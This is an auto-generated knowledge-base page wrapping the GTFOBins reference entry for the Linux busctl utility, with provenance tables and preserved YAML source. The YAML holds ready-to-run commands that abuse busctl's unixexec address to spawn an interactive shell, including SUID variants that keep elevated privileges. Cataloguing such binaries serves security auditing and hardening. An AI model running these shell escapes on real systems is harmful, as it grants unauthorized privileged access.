---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# busctl

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `busctl` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/busctl` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [busctl](../../tools/linux/busctl.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | busctl |
| name | busctl |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/busctl/ |

## Preserved Source Material

```yaml
_body: ''
_name: busctl
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/busctl
functions:
  inherit:
  - code: busctl --show-machine
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    from: less
  shell:
  - code: busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel
      s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
    contexts:
      sudo: null
      suid:
        code: busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel
          s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'
        shell: false
      unprivileged: null
  - code: busctl --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
    contexts:
      sudo: null
      suid:
        code: busctl --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'
        shell: false
      unprivileged: null
```
